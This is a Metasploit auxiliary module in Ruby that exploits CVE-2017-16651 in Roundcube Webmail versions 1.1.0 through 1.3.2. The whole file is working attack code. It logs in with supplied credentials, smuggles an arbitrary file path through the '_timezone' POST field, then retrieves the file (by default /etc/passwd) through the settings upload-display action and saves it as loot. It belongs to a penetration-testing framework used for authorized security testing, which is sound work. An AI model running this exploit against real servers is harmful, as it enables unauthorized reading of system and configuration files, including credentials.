##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Roundcube TimeZone Authenticated File Disclosure',
        'Description' => %q{
          Roundcube Webmail allows unauthorized access to arbitrary files on the host's filesystem, including configuration files.
          This affects all versions from 1.1.0 through version 1.3.2. The attacker must be able to authenticate at the target system
          with a valid username/password as the attack requires an active session.

          Tested against version 1.3.2
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'joel @ ndepthsecurity', # msf module
          'stonepresto', # EDB Module POC
          'thomascube' # original PoC, analysis
        ],
        'References' => [
          [ 'EDB', '49510' ],
          [ 'URL', 'https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1'],
          [ 'CVE', '2017-16651']
        ],

        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2017-11-09',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, 'Email User to login with', '']),
        OptString.new('PASSWORD', [ true, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The URI of the Roundcube Application', '/']),
        OptString.new('FILE', [ true, 'The file to read', '/etc/passwd'])
      ]
    )
  end

  def run
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true,
      'vars_get' => {
        '_task' => 'login'
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response Code (response code: #{res.code})") unless res.code == 200

    unless res.body =~ /name="_token" value="([^"]+)"/
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to find Token Value")
    end

    vprint_good("Token Value: #{Regexp.last_match(1)}")

    vprint_status('Attempting login')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        '_token' => Regexp.last_match(1),
        '_task' => 'login',
        '_action' => 'login',
        '_timezone[files][1][path]' => datastore['FILE'],
        '_url' => '_task=login',
        '_user' => datastore['USERNAME'],
        '_pass' => datastore['PASSWORD']
      },
      'vars_get' => {
        '_task' => 'login'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") unless res.code == 302

    vprint_status('Attempting exploit')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        '_task' => 'settings',
        '_action' => 'upload-display',
        '_from' => 'timezone',
        '_file' => 'rcmfile1'
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response Code (response code: #{res.code})") unless res.code == 200
    print_good(res.body)

    store_loot('Roundcube.file', 'text/plain', rhost, res.body, datastore['FILE'])
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end
end
